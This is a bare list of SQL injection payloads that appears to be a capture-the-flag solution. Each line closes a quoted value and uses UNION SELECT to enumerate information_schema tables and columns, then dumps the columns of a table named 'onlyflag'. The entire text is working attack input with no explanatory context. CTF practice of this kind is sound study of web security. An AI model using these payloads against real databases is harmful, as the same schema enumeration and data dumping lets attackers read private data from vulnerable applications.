1234' union select table_name, table_schema, 'value3', 'value4' from information_schema.tables where '1' = '1

1234' union select column_name, 'value2', 'value3', 'value4'  from information_schema.columns where table_name = 'onlyflag

1234' union select sname, svalue, sflag, sclose from onlyflag where '1' = '1
1234' union select sname, sflag, svalue, sclose from onlyflag where '1' = '1